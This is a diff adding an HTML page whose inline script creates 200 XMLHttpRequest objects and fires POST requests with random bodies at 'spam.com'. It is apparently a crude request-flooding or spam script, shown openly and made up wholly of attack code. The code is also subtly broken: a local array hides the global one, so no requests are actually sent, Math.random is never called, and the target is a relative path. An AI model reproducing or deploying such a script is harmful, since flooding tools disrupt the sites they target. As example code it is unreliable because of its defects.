@@ -1,1 +1,19 @@
-
+<body>
+  <script>
+    var connections = [];
+    function spam() {
+      var connections = []
+      for (i=0;i<200;i++) {
+        var xhttp = new XMLHttpRequest();
+        connections.push(xhttp);
+      }
+    }
+    function respam() {
+      for (i=0;i<connections.length;i++) {
+        connections[i].open("POST", "spam.com", true);
+        connections[i].setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+        connections[i].send(Math.round(Math.random))
+      }
+    }
+  </script>
+</body>
